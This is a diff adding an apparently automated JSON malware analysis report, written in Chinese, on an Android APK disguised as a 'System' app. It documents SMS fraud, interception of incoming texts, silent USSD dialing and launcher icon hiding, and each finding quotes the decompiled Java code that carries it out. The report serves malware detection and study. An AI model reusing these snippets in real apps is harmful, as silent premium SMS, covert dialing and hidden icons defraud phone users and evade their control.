@@ -1,0 +1,151 @@
+{
+  "APK信息": {
+    "文件名": "33a64f5553516218883d0a46e37fe7f1e548e84a456bb1d788eb40b6787b57ff.apk",
+    "sha256": "33a64f5553516218883d0a46e37fe7f1e548e84a456bb1d788eb40b6787b57ff",
+    "包名": "com.fanta.services",
+    "应用名": "System",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 308.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\fanta\\services\\SocketService;",
+          "method_signature": "sendSms(MessageItem item)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "PendingIntent sentPendingIntent = PendingIntent.getBroadcast(this.ctx, reqCode, intent, 0);\nPendingIntent DeliverPending = PendingIntent.getBroadcast(this.ctx, reqCode, intentDeliver, 0);\nSmsManager smsManager = SmsManager.getDefault();\nsmsManager.sendTextMessage(item.phone, null, item.text, sentPendingIntent, DeliverPending);",
+          "malicious_code_snippet_context": "          intent.setAction(this.SENT);\n          intent.putExtra(Const.CONST_ID_SEND_SMS, item.id);\n          intent.putExtra(Const.CONST_TASK_ID_SEND_SMS, item.task_id);\n>>>         PendingIntent sentPendingIntent = PendingIntent.getBroadcast(this.ctx, reqCode, intent, 0);\n>>>         Intent intentDeliver = new Intent(this.DELIVERED);\n>>>         intentDeliver.putExtra(Const.CONST_ID_SEND_SMS, item.id);\n>>>         PendingIntent DeliverPending = PendingIntent.getBroadcast(this.ctx, reqCode, intentDeliver, 0);\n          SmsManager smsManager = SmsManager.getDefault();\n          try {\n              smsManager.sendTextMessage(item.phone, null, item.text, sentPendingIntent, DeliverPending);",
+          "behavior_description": "代码从传入的 MessageItem 对象中获取目标手机号(item.phone)和短信内容(item.text)，通过 SmsManager.getDefault() 获取系统短信管理器，并调用 sendTextMessage() 在后台静默发送短信，同时注册 SENT 和 DELIVERED 两个 PendingIntent 来监控短信发送与送达状态。整个过程无需用户交互，属于典型的静默短信发送行为，可被用于短信欺诈、订阅扣费业务或向指定号码发送隐私数据。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\fanta\\services\\SocketService;",
+          "method_signature": "ussd(String command, int id)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String encodedHash = Uri.encode(\"#\");\nString ussd = command + \"\" + encodedHash;\nIntent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + ussd));\nintent.addFlags(268435456);\nif (id > 0 && Build.VERSION.SDK_INT >= 23 && checkSelfPermission(\"android.permission.CALL_PHONE\") != 0) {\n    setStatusSms(id, 7);\n} else {\n    this.ctx.startActivity(intent);\n}",
+          "malicious_code_snippet_context": "  \n      private void ussd(String command, int id) {\n          try {\n>>>             String encodedHash = Uri.encode(\"#\");\n>>>             String ussd = command + \"\" + encodedHash;\n>>>             M.d(\"ussd(): \", ussd);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + ussd));\n>>>             intent.addFlags(268435456);\n>>>             if (id > 0 && Build.VERSION.SDK_INT >= 23 && checkSelfPermission(\"android.permission.CALL_PHONE\") != 0) {\n>>>                 setStatusSms(id, 7);\n>>>             } else {\n>>>                 this.ctx.startActivity(intent);\n              }\n          } catch (Exception e) {\n              e.printStackTrace();",
+          "behavior_description": "该方法接收外部传入的 command 参数（USSD指令），拼接编码后的#号构造完整USSD码，通过 android.intent.action.CALL 动作和 tel: URI 构造拨号 Intent，并添加 FLAG_ACTIVITY_NEW_TASK 标志后直接 startActivity 发起静默拨号。ACTION_CALL 会直接拨出电话而无需用户确认，可被远程指令控制拨打 USSD 码或付费号码，造成用户话费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\fanta\\services\\MainActivity;",
+          "method_signature": "onClick(View v)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "PackageManager p = getPackageManager();\nComponentName componentName = new ComponentName(this.ctx.getPackageName(), this.ctx.getClass().getName());\np.setComponentEnabledSetting(componentName, 2, 1);",
+          "malicious_code_snippet_context": "                  MainActivity.this.closeActivity();\n              }\n          });\n>>>         PackageManager p = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(this.ctx.getPackageName(), this.ctx.getClass().getName());\n>>>         p.setComponentEnabledSetting(componentName, 2, 1);\n          if (this.app.getSid() < 1) {\n              Intent i = new Intent(this, (Class<?>) AdmActivity.class);\n              i.addFlags(268435456);",
+          "behavior_description": "代码通过PackageManager获取当前应用主Activity的ComponentName，并调用setComponentEnabledSetting将其设置为禁用状态(2)，从而在桌面隐藏应用图标，使用户难以察觉和卸载，属于恶意软件常用的隐蔽和持久化手段。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
